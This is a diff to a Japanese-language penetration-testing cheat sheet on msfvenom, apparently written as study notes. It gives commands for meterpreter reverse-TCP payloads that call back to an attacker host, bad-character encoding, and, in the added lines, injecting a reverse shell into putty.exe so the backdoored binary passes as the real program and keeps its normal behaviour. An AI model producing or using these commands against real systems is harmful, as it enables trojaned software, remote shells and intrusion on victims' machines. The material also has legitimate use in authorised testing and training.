@@ -304,11 +304,34 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.11.9 LPORT=4444 -f exe
 
 ### エンコード指定してペイロード作成
 
-エンコードの目的はウイルス対策を回避することではなく、ペイロードの動作を保証すること
+エンコードの目的はウイルス対策を回避することではなく、ペイロードの動作を保証すること（例えば、ペイロードにNULLや改行文字が含まれている場合に機能しないことを防ぐ）
 
 ```shell
 # 'zutto_dekiru'エンコード
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o rev.exe -e x64/zutto_dekiru
+```
+
+### 特定文字除去
+
+-b を指定する場合は適切なエンコーダが自動的に選択されるので、-e を指定する必要はない
+
+```sh
+# NULL文字、改行文字を除去
+-b '\x00\x0a\x0d'
+```
+
+### 既存バイナリにペイロードを注入
+
+-x で既存の実行ファイルに見せかける
+
+```sh
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -x /root/templates/putty.exe -f exe -o putty_backdoor.exe
+```
+
+-k でペイロードを別のスレッドで実行することで、テンプレートの元の動作を維持しようとする
+
+```sh
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -x /root/templates/putty.exe -k -f exe -o putty_backdoor.exe
 ```
 
 ## コマンドインジェクションを利用する例
